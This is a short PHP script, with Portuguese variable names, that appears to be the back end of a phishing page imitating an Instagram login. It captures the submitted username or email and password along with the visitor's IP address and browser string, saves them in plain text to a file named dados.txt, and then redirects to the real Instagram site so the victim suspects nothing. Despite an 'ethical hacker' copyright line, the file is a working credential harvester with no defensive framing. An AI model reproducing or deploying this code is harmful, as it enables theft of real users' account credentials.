<?php
if (isset($_POST['input-email-usuario-telefone']) && !empty($_POST['input-email-usuario-telefone']) && isset($_POST['input-senha']) && !empty($_POST['input-senha'])) {

	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$endereco_ip = $_SERVER['HTTP_CLIENT_IP'];
	}

	else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$endereco_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	
	}

	else if (!empty($_SERVER['REMOTE_ADDR'])) {
		$endereco_ip = $_SERVER['REMOTE_ADDR'];
	}
       
	$navegador = $_SERVER['HTTP_USER_AGENT'];
  	$usuario = addslashes($_POST['input-email-usuario-telefone']);
  	$senha = addslashes($_POST['input-senha']);
  	$data = Date("d-m-Y");

	# Dados
	$dados = fopen('dados.txt', 'w');
	fwrite($dados, "Informaçôes do navegador:\n");
	fwrite($dados, "Navegador: {$navegador}\n");
	fwrite($dados, "Endereço IP: {$endereco_ip}\n");
	fwrite($dados, "\nInformaçôes de acesso:\n");
	fwrite($dados, "Usuário: {$usuario}\n");
	fwrite($dados, "Senha: {$senha}\n");
	fwrite($dados, "\n© Copyright hacker ético\n");

       	header('Location: https://www.instagram.com');
} 
else {
  header('Location: ../index.php');
}
?>
